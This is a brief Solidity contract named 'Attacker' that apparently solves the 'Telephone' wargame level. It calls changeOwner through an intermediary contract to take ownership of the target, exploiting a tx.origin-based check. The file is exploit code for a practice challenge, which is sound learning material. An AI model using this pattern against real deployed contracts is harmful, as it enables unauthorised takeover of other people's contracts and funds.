// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view;
}

contract Attacker {
    ITelephone private target;

    constructor(address targetAddress){
        target = ITelephone(targetAddress);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}